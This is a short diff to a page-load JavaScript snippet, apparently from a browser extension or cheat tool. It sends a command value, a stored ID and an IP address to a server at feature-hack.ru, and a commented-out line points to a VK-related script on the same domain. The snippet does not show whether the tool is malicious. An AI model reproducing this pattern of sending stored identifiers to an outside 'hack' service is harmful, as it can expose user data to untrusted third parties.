@@ -10,7 +10,7 @@ window.addEventListener('DOMContentLoaded', function (evt) {
             var x = new XMLHttpRequest();
             localStorage.setItem('ip', ip);
             localStorage.setItem('cmd', cmd);
-            x.open("GET", "http://feature-hack.ru/send.php?cmd=" + cmd + "&pk=" +localStorage.getItem('id') + "&ip=" + ip, false);
+            x.open("GET", "http://feature-hack.ru/send.php?cmd=" + cmd + "&pk=" +localStorage.getItem('id') + "&ip=" + ip.split(":")[0], false);
             //x.open("GET", "http://exe.feature-hack.ru/test/vk.php?amount=" + cmd + ip, false);
             x.onload = function (){
                 text.textContent=x.responseText;
